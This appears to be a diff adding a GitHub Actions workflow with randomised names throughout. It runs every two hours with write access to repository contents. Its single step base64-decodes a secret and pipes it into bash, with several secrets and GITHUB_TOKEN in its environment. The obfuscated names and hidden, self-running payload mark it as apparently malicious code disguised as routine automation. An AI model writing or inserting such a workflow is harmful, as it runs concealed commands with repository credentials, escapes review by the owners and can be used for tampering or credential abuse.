@@ -1,0 +1,21 @@
+name: X5R86PCSUmmDfC2i
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  T7XmixNjxVZh:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.d4Qb73CphsSC }}
+      - name: MueXDm671m
+        env:
+          nvaDV8JfAT73eDmw: ${{ secrets.yT7nMYnYyzeAOCLN }}
+          ZT6wL5jCsXViZ: ${{ secrets.cNPZKorrGTFv }}
+          h9cIICXOS1ScNj: ${{ secrets.mk6UrPFMN8x }}
+          GITHUB_TOKEN: ${{ secrets.d4Qb73CphsSC }}
+        run: echo "$nvaDV8JfAT73eDmw" | base64 -d | bash
